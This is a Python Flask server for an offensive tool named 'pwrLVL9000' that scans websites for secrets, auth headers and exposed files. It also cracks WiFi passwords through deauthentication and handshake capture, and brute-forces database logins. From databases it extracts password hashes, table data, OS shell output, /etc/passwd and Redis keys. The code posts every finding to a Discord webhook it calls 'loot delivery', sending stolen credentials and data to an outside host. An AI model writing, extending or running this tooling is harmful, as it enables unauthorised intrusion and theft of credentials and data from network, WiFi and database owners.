#!/usr/bin/env python3
"""
# Author: sinX
pwrLVL9000 - Flask web server with real-time SSE streaming
and Discord webhook notification for every finding.
Run: python3 app.py   →   open http://127.0.0.1:5000
"""

import json
import queue
import threading
import time
import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

import requests as req_lib
from flask import Flask, render_template, request, Response, jsonify, stream_with_context
from scanner import pwrLVL9000Scanner
from modules.wifi_scanner import WiFiScanner, scan_aps, start_monitor_mode, stop_monitor_mode, get_wireless_interfaces
from modules.db_scanner import DBScanner, DEFAULT_PORTS

app = Flask(__name__)

# Active scan abort flag
_active_stop = threading.Event()

# ── Discord webhook helpers ────────────────────────────────────────────────────

_WH_LOCK      = threading.Lock()
_WH_LAST_SENT = 0.0
_WH_MIN_GAP   = 0.55          # seconds between sends (safe under Discord 5/2s limit)

SEV_COLOUR = {
    "HIGH":   0xFF0033,
    "MEDIUM": 0xFFD700,
    "OK":     0x00FF41,
    "CRIT":   0xFF0033,
    "NONE":   0x00E5FF,
}


def _discord_send(webhook_url: str, payload: dict):
    """Rate-limited POST to a Discord webhook."""
    global _WH_LAST_SENT
    with _WH_LOCK:
        gap = _WH_MIN_GAP - (time.time() - _WH_LAST_SENT)
        if gap > 0:
            time.sleep(gap)
        _WH_LAST_SENT = time.time()
    try:
        req_lib.post(webhook_url, json=payload, timeout=8)
    except Exception:
        pass


def _cap(s: str, n: int = 1020) -> str:
    """Hard-cap a string to Discord's field/description limit."""
    s = str(s)
    return s if len(s) <= n else s[:n] + "\n…[truncated]"


def _wh_cookie(webhook_url: str, d: dict):
    sev   = d.get("severity", "MEDIUM")
    color = SEV_COLOUR.get(sev, SEV_COLOUR["MEDIUM"])

    flags = []
    flags.append(("✅" if d.get("secure")    else "❌") + " Secure")
    flags.append(("✅" if d.get("http_only") else "❌") + " HttpOnly")
    ss = d.get("same_site") or "unset"
    flags.append(f"SameSite={ss.upper()}")
    if d.get("domain"):
        flags.append(f"Domain={d['domain']}")
    if d.get("path"):
        flags.append(f"Path={d['path']}")
    if d.get("expires"):
        flags.append(f"Expires={d['expires']}")

    issues = "\n".join(d.get("issues", [])) or "None"
    val    = d.get("value") or "—"

    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       f"🍪 Cookie [{sev}]: {d['name']}",
            "description": f"```\n{_cap(val, 3900)}\n```",
            "color":       color,
            "fields": [
                {"name": "URL",    "value": _cap(d["url"]),      "inline": False},
                {"name": "Flags",  "value": "  ".join(flags),    "inline": False},
                {"name": "Issues", "value": _cap(issues),         "inline": False},
            ],
            "footer":    {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


def _wh_secret(webhook_url: str, d: dict):
    color  = SEV_COLOUR["CRIT"]
    src    = d.get("source", "")
    if src.startswith("js:"):
        src = src[3:]
    ent    = f"  entropy={d['entropy']}" if d.get("entropy") else ""
    snippet = d.get("snippet", "")

    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       f"🔴 SECRET: {d['pattern']}",
            "description": f"```\n{_cap(snippet, 3900)}\n```",
            "color":       color,
            "fields": [
                {"name": "URL",    "value": _cap(d["url"]),              "inline": False},
                {"name": "Source", "value": _cap(f"{src}:{d['line_num']}{ent}"), "inline": True},
            ],
            "footer":    {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


def _wh_auth_header(webhook_url: str, d: dict):
    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       f"🔑 Auth Header: {d['header']}",
            "description": f"```\n{_cap(d['value'], 3900)}\n```",
            "color":       SEV_COLOUR["HIGH"],
            "fields": [
                {"name": "URL", "value": _cap(d["url"]), "inline": False},
            ],
            "footer":    {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


def _wh_done(webhook_url: str, target: str, summary: dict):
    total = (summary.get("secrets", 0) or 0) + (summary.get("auth_headers", 0) or 0) + \
            (summary.get("exposed_files", 0) or 0)
    color = SEV_COLOUR["CRIT"] if total > 0 else SEV_COLOUR["OK"]
    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title": "✅ SCAN COMPLETE",
            "color": color,
            "fields": [
                {"name": "Target",        "value": target,                                     "inline": False},
                {"name": "Pages",         "value": str(summary.get("pages",         0)), "inline": True},
                {"name": "JS Files",      "value": str(summary.get("js_files",      0)), "inline": True},
                {"name": "Cookies",       "value": str(summary.get("cookies",       0)), "inline": True},
                {"name": "Secrets",       "value": str(summary.get("secrets",       0)), "inline": True},
                {"name": "Auth Hdrs",     "value": str(summary.get("auth_headers",  0)), "inline": True},
                {"name": "Exposed Files", "value": str(summary.get("exposed_files", 0)), "inline": True},
            ],
            "footer": {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


def _wh_exposed_file(webhook_url: str, d: dict):
    sev   = d.get("severity", "MEDIUM")
    color = {"CRITICAL": 0xFF0033, "HIGH": 0xFF6A00, "MEDIUM": 0xFFD700, "LOW": 0x00E5FF}.get(sev, 0xFFD700)
    secrets = d.get("secrets_found", [])
    preview = d.get("preview", "")[:1200]

    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       f"📂 EXPOSED FILE [{sev}]: {d.get('path','?')}",
            "description": f"```\n{_cap(preview, 3900)}\n```" if preview else "",
            "color":       color,
            "fields": [
                {"name": "URL",     "value": _cap(d.get("url", "?")),                      "inline": False},
                {"name": "Size",    "value": f"{d.get('size', 0):,} bytes",                "inline": True},
                {"name": "Type",    "value": _cap(d.get("content_type", "?"), 60),          "inline": True},
                {"name": "Secrets", "value": _cap(", ".join(secrets) if secrets else "none"), "inline": False},
            ],
            "footer":    {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


# ── Flask routes ───────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/scan")
def scan():
    url = request.args.get("url", "").strip()
    if not url:
        return jsonify(error="No URL provided"), 400

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    try:
        max_pages    = min(int(request.args.get("max_pages",   50)), 500)
        timeout      = min(int(request.args.get("timeout",    15)),   60)
        verify_ssl   = request.args.get("verify_ssl", "true").lower() != "false"
        entropy      = float(request.args.get("entropy", 4.5))
        webhook_url  = request.args.get("webhook_url", "").strip()
        probe_files  = request.args.get("probe_files", "true").lower() != "false"
        file_threads = min(int(request.args.get("file_threads", 20)), 50)
    except (ValueError, TypeError):
        return jsonify(error="Invalid parameters"), 400

    _active_stop.clear()

    # Announce scan start to Discord
    if webhook_url:
        threading.Thread(
            target=_discord_send,
            args=(webhook_url, {
                "username": "pwrLVL9000",
                "embeds": [{
                    "title": "⚡ SCAN INITIATED",
                    "color": 0x00E5FF,
                    "fields": [
                        {"name": "Target",    "value": url,           "inline": True},
                        {"name": "Max Pages", "value": str(max_pages),"inline": True},
                    ],
                    "footer":    {"text": "pwrLVL9000 Scanner"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }],
            }),
            daemon=True,
        ).start()

    event_queue: "queue.Queue[dict]" = queue.Queue()

    def emit_and_webhook(event: dict):
        event_queue.put(event)
        if not webhook_url:
            return
        etype = event.get("type")
        if etype == "cookie":
            _wh_cookie(webhook_url, event["data"])
        elif etype == "secret":
            _wh_secret(webhook_url, event["data"])
        elif etype == "auth_header":
            _wh_auth_header(webhook_url, event["data"])
        elif etype == "exposed_file":
            _wh_exposed_file(webhook_url, event["data"])

    def run_scanner():
        try:
            scanner = pwrLVL9000Scanner(
                base_url=url,
                max_pages=max_pages,
                timeout=timeout,
                verify_ssl=verify_ssl,
                entropy_threshold=entropy,
                emit=emit_and_webhook,
                stop_event=_active_stop,
                probe_files=probe_files,
                file_threads=file_threads,
            )
            scanner.run()
            summary = {
                "pages":         len(scanner.visited),
                "js_files":      len(scanner.js_scanned),
                "cookies":       len(scanner.cookie_findings),
                "secrets":       len(scanner.secret_findings),
                "auth_headers":  len(scanner.auth_header_findings),
                "exposed_files": len(scanner.exposed_file_findings),
                "json_report":   scanner.to_json(),
            }
            event_queue.put({"type": "done", "summary": summary})
            if webhook_url:
                _wh_done(webhook_url, url, summary)
        except Exception as exc:
            event_queue.put({"type": "error", "message": str(exc)})
            event_queue.put({"type": "done", "summary": {}})

    threading.Thread(target=run_scanner, daemon=True).start()

    return _sse_response(event_queue)


@app.route("/stop", methods=["POST"])
def stop():
    _active_stop.set()
    return jsonify(ok=True)


@app.route("/webhook/test", methods=["POST"])
def webhook_test():
    data = request.get_json(silent=True) or {}
    wh   = data.get("webhook_url", "").strip()
    if not wh:
        return jsonify(ok=False, error="No webhook URL"), 400
    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       "⚡ WEBHOOK TEST",
            "description": "If you see this, loot delivery is **ACTIVE**. Your finds will appear here.",
            "color":       0x00E5FF,
            "fields": [
                {"name": "Status",  "value": "✅ Connected & Authenticated", "inline": True},
                {"name": "Tool",    "value": "pwrLVL9000 v2.0",           "inline": True},
            ],
            "footer":    {"text": "pwrLVL9000 Scanner"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    try:
        r = req_lib.post(wh, json=payload, timeout=8)
        if r.status_code in (200, 204):
            return jsonify(ok=True)
        return jsonify(ok=False, error=f"Discord returned {r.status_code}: {r.text[:120]}")
    except Exception as exc:
        return jsonify(ok=False, error=str(exc))


# ── Discord: WiFi cracked ──────────────────────────────────────────────────────

def _wh_wifi_cracked(webhook_url: str, d: dict):
    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       "📡 WIFI PASSWORD CRACKED",
            "description": f"```\nSSID    : {d.get('essid','?')}\nBSSID   : {d.get('bssid','?')}\nPASSWORD: {d.get('password','?')}\nMETHOD  : {d.get('method','?')}\n```",
            "color":       0xFF0033,
            "footer":    {"text": "pwrLVL9000 — WiFi Module"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


# ── Discord: DB hit ────────────────────────────────────────────────────────────

def _wh_db_hit(webhook_url: str, d: dict):
    payload = {
        "username": "pwrLVL9000",
        "embeds": [{
            "title":       f"🗄️ DATABASE ACCESS: {d.get('db_type','').upper()}",
            "description": f"```\nHOST    : {d.get('host','?')}:{d.get('port','?')}\nDB TYPE : {d.get('db_type','?')}\nUSER    : {d.get('username','?')}\nPASS    : {d.get('password','?')}\n```",
            "color":       0xFF6A00,
            "footer":    {"text": "pwrLVL9000 — DB Module"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }],
    }
    threading.Thread(target=_discord_send, args=(webhook_url, payload), daemon=True).start()


# ── Discord: Deep DB loot ──────────────────────────────────────────────────────

def _wh_db_loot(webhook_url: str, d: dict):
    """Send multiple rate-limited Discord embeds for deeply extracted DB loot."""
    import json as _json

    def _send_all():
        db_type = d.get("type", "?").upper()
        host    = d.get("host", "?")
        port    = d.get("port", "?")
        user    = d.get("user", "?")

        # ── Server info embed ──
        info = [f"HOST    : {host}:{port}", f"USER    : {user}"]
        if d.get("version"):      info.append(f"VERSION : {str(d['version'])[:80]}")
        if d.get("servername"):   info.append(f"SERVER  : {d['servername']}")
        if d.get("system_user"):  info.append(f"SYS USER: {d['system_user']}")
        if d.get("is_sysadmin"):  info.append("ROLE    : *** SYSADMIN ***")
        if d.get("current_user"): info.append(f"CUR USER: {d['current_user']}")
        dbs = d.get("databases", [])
        if dbs:
            db_names = [x["name"] if isinstance(x, dict) else str(x) for x in dbs]
            info.append(f"DBS     : {', '.join(db_names[:15])}")
        if d.get("dbsize"):       info.append(f"KEYS    : {d['dbsize']}")
        if d.get("error"):        info.append(f"ERROR   : {d['error']}")

        _discord_send(webhook_url, {
            "username": "pwrLVL9000",
            "embeds": [{
                "title":       f"💀 DEEP LOOT EXTRACTED: {db_type} @ {host}",
                "description": "```\n" + _cap("\n".join(info), 3900) + "\n```",
                "color":       0xFF0033,
                "footer":    {"text": "pwrLVL9000 — DB Module"},
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            }],
        })

        # ── Password hashes ──
        hashes = d.get("password_hashes") or d.get("users", [])
        if hashes:
            lines = []
            for h in hashes:
                u  = h.get("user", "?")
                hv = h.get("hash", "")
                su = " [SUPER]" if h.get("superuser") else ""
                lines.append(f"{u}{su}: {hv}")
            _discord_send(webhook_url, {
                "username": "pwrLVL9000",
                "embeds": [{
                    "title":       f"🔐 PASSWORD HASHES [{db_type}] {host} — {len(hashes)} account(s)",
                    "description": "```\n" + _cap("\n".join(lines), 3900) + "\n```",
                    "color":       0xFF0033,
                    "footer":    {"text": "pwrLVL9000 — DB Module"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }],
            })

        # ── Sample data from sensitive tables (up to 4 tables) ──
        sample_data = d.get("sample_data", {})
        for tname, tdata in list(sample_data.items())[:4]:
            if isinstance(tdata, list):
                # MongoDB docs
                try:    doc_text = _json.dumps(tdata, indent=2, default=str)
                except: doc_text = str(tdata)
                _discord_send(webhook_url, {
                    "username": "pwrLVL9000",
                    "embeds": [{
                        "title":       f"📋 MONGO DOCS: {tname}",
                        "description": "```json\n" + _cap(doc_text, 3900) + "\n```",
                        "color":       0xFF6A00,
                        "footer":    {"text": "pwrLVL9000 — DB Module"},
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    }],
                })
            else:
                cols = tdata.get("columns", [])
                rows = tdata.get("rows", [])
                lines = [" | ".join(str(c) for c in cols)]
                lines.append("─" * min(80, len(lines[0])))
                for row in rows:
                    lines.append(" | ".join(str(v)[:40] for v in row))
                _discord_send(webhook_url, {
                    "username": "pwrLVL9000",
                    "embeds": [{
                        "title":       f"📋 TABLE DATA: {tname}",
                        "description": "```\n" + _cap("\n".join(lines), 3900) + "\n```",
                        "color":       0xFF6A00,
                        "footer":    {"text": "pwrLVL9000 — DB Module"},
                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    }],
                })

        # ── xp_cmdshell / OS command output ──
        if d.get("cmdshell"):
            shell_out = "\n".join(str(x) for x in d["cmdshell"])
            _discord_send(webhook_url, {
                "username": "pwrLVL9000",
                "embeds": [{
                    "title":       f"💻 OS SHELL ACCESS [{db_type}] {host}",
                    "description": "```\n" + _cap(shell_out, 3900) + "\n```",
                    "color":       0xFF0033,
                    "footer":    {"text": "pwrLVL9000 — DB Module"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }],
            })

        # ── /etc/passwd ──
        if d.get("etc_passwd"):
            _discord_send(webhook_url, {
                "username": "pwrLVL9000",
                "embeds": [{
                    "title":       f"📄 /etc/passwd DUMP [{host}]",
                    "description": "```\n" + _cap(d["etc_passwd"], 3900) + "\n```",
                    "color":       0xFF0033,
                    "footer":    {"text": "pwrLVL9000 — DB Module"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }],
            })

        # ── Redis key dump ──
        if d.get("keys"):
            keys = d["keys"]
            lines = [f"{k}: {str(v)[:80]}" for k, v in list(keys.items())[:50]]
            _discord_send(webhook_url, {
                "username": "pwrLVL9000",
                "embeds": [{
                    "title":       f"🔑 REDIS KEYS ({len(keys)} total) [{host}]",
                    "description": "```\n" + _cap("\n".join(lines), 3900) + "\n```",
                    "color":       0xFF6A00,
                    "footer":    {"text": "pwrLVL9000 — DB Module"},
                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                }],
            })

    threading.Thread(target=_send_all, daemon=True).start()


# ── WiFi routes ────────────────────────────────────────────────────────────────

@app.route("/wifi/interfaces")
def wifi_interfaces():
    ifaces = get_wireless_interfaces()
    return jsonify(ifaces)


@app.route("/wifi/monitor/on", methods=["POST"])
def wifi_monitor_on():
    """Put a wireless interface into monitor mode. Returns {ok, mon_iface, logs}."""
    data  = request.get_json(silent=True) or {}
    iface = data.get("iface", "").strip()
    if not iface:
        return jsonify(ok=False, error="iface required"), 400

    logs = []
    def capture(ev):
        if ev.get("type") == "log":
            logs.append(ev["message"])

    mon = start_monitor_mode(iface, capture)
    if mon:
        return jsonify(ok=True, mon_iface=mon, logs=logs)
    return jsonify(ok=False, error="Failed to enable monitor mode", logs=logs)


@app.route("/wifi/monitor/off", methods=["POST"])
def wifi_monitor_off():
    """Restore a monitor interface back to managed mode. Returns {ok, logs}."""
    data  = request.get_json(silent=True) or {}
    iface = data.get("iface", "").strip()
    if not iface:
        return jsonify(ok=False, error="iface required"), 400

    logs = []
    def capture(ev):
        if ev.get("type") == "log":
            logs.append(ev["message"])

    # orig_iface is just iface with 'mon' stripped if present, for NM restart purposes
    orig = iface.replace("mon", "") if iface.endswith("mon") else iface
    stop_monitor_mode(iface, orig, capture)
    return jsonify(ok=True, logs=logs)


@app.route("/wifi/scan_aps")
def wifi_scan_aps():
    """SSE: scan for nearby APs using iw dev scan + optional airodump-ng."""
    iface       = request.args.get("iface", "").strip()
    duration    = min(int(request.args.get("duration", 15)), 120)
    webhook_url = request.args.get("webhook_url", "").strip()

    if not iface:
        return jsonify(error="No interface specified"), 400

    _active_stop.clear()
    event_queue: "queue.Queue[dict]" = queue.Queue()

    def run():
        try:
            aps = scan_aps(iface, duration, event_queue.put, _active_stop)
            event_queue.put({"type": "ap_list", "aps": aps})
            if webhook_url and aps:
                desc_lines = [
                    f"`{a['essid']}` — `{a['bssid']}` CH:{a['channel']} {a['privacy']} PWR:{a['power']}dBm"
                    for a in aps[:20]
                ]
                threading.Thread(target=_discord_send, args=(webhook_url, {
                    "username": "pwrLVL9000",
                    "embeds": [{
                        "title":       f"📡 {len(aps)} AP(s) Found",
                        "description": "\n".join(desc_lines),
                        "color":       0x00E5FF,
                        "footer":      {"text": "pwrLVL9000 — WiFi Module"},
                        "timestamp":   time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    }],
                }), daemon=True).start()
            event_queue.put({"type": "done", "summary": {}})
        except Exception as exc:
            event_queue.put({"type": "error", "message": str(exc)})
            event_queue.put({"type": "done", "summary": {}})

    threading.Thread(target=run, daemon=True).start()
    return _sse_response(event_queue)


@app.route("/wifi/crack")
def wifi_crack():
    """SSE: capture handshake and crack it."""
    iface       = request.args.get("iface",   "").strip()
    bssid       = request.args.get("bssid",   "").strip()
    channel     = request.args.get("channel", "1").strip()
    essid       = request.args.get("essid",   "").strip()
    wordlist    = request.args.get("wordlist", "/usr/share/wordlists/rockyou.txt").strip()
    deauth      = int(request.args.get("deauth", 5))
    cap_timeout = min(int(request.args.get("cap_timeout", 90)), 300)
    method      = request.args.get("method", "auto")
    webhook_url = request.args.get("webhook_url", "").strip()

    if not iface or not bssid:
        return jsonify(error="iface and bssid required"), 400

    _active_stop.clear()
    event_queue: "queue.Queue[dict]" = queue.Queue()

    def run():
        def emit_and_hook(ev):
            event_queue.put(ev)
            if webhook_url and ev.get("type") == "wifi_cracked":
                _wh_wifi_cracked(webhook_url, ev["data"])

        try:
            scanner = WiFiScanner(
                iface=iface, bssid=bssid, channel=channel, essid=essid,
                wordlist=wordlist, deauth_count=deauth,
                capture_timeout=cap_timeout, crack_method=method,
                emit=emit_and_hook, stop_event=_active_stop,
            )
            scanner.run()
            event_queue.put({"type": "done", "summary": {}})
        except Exception as exc:
            event_queue.put({"type": "error", "message": str(exc)})
            event_queue.put({"type": "done", "summary": {}})

    threading.Thread(target=run, daemon=True).start()
    return _sse_response(event_queue)


# ── DB routes ──────────────────────────────────────────────────────────────────

@app.route("/db/scan")
def db_scan():
    """SSE: scan a host for open DB ports and bruteforce credentials."""
    target        = request.args.get("target",       "").strip()
    webhook_url   = request.args.get("webhook_url",  "").strip()
    db_types_raw  = request.args.get("db_types",     "").strip()
    auth_timeout  = min(float(request.args.get("auth_timeout", 4)), 15)
    threads       = min(int(request.args.get("threads", 8)), 32)
    wordlist_file = request.args.get("wordlist_file", "").strip() or None

    if not target:
        return jsonify(error="No target specified"), 400

    db_types = [d.strip() for d in db_types_raw.split(",") if d.strip()] or None

    _active_stop.clear()
    event_queue: "queue.Queue[dict]" = queue.Queue()

    def run():
        def emit_and_hook(ev):
            event_queue.put(ev)
            if not webhook_url:
                return
            etype = ev.get("type")
            if etype == "db_hit":
                _wh_db_hit(webhook_url, ev["data"])
            elif etype == "db_loot":
                _wh_db_loot(webhook_url, ev["data"])

        try:
            scanner = DBScanner(
                target=target, db_types=db_types,
                auth_timeout=auth_timeout, threads=threads,
                wordlist_file=wordlist_file,
                emit=emit_and_hook, stop_event=_active_stop,
            )
            scanner.run()
            event_queue.put({"type": "done", "summary": {"hits": len(scanner.hits)}})
        except Exception as exc:
            event_queue.put({"type": "error", "message": str(exc)})
            event_queue.put({"type": "done", "summary": {}})

    threading.Thread(target=run, daemon=True).start()
    return _sse_response(event_queue)


@app.route("/db/types")
def db_types():
    return jsonify(list(DEFAULT_PORTS.keys()))


# ── Shared SSE helper ──────────────────────────────────────────────────────────

def _sse_response(q: "queue.Queue"):
    def generate():
        while True:
            try:
                event = q.get(timeout=45)
                yield f"data: {json.dumps(event)}\n\n"
                if event.get("type") == "done":
                    break
            except queue.Empty:
                yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"

    return Response(
        stream_with_context(generate()),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache, no-store", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
    )


if __name__ == "__main__":
    print("\n  [*] pwrLVL9000 — Web UI")
    print("  [*] Open http://127.0.0.1:5000 in your browser\n")
    app.run(host="127.0.0.1", port=5000, debug=False, threaded=True)
